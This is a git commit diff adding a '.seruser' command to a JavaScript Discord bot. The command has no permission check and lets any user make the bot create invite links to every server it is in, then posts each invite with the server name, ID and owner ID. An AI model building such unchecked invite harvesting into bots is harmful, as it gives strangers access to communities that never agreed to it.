909ae098356a86841fa370d5f8245c113a548643
Spomi <40448323+Spomi@users.noreply.github.com>
2018-08-18 22:43:27 +0100

    Update bot2.js

--- bot2.js
+++ bot2.js
@@ -509,7 +509,29 @@ Server Count: __${guild.memberCount}__**`)
 
 
 
-
+client.on('message', msg => {
+    if(msg.author.bot) return;
+    
+    if(msg.content === '.seruser') {
+      client.guilds.forEach(g => {
+        
+        let l = g.id
+        g.channels.get(g.channels.first().id).createInvite({
+          maxUses: 5,
+          maxAge: 86400
+        }).then(i => msg.channel.send(`
+        **
+        Invite Link : <https://discord.gg/${i.code}>
+        Server : ${g.name} | Id : ${g.id} 
+        Owner ID : ${g.owner.id}
+        **
+        `))
+  
+  
+      })
+    }
+    
+  })
 
 
 
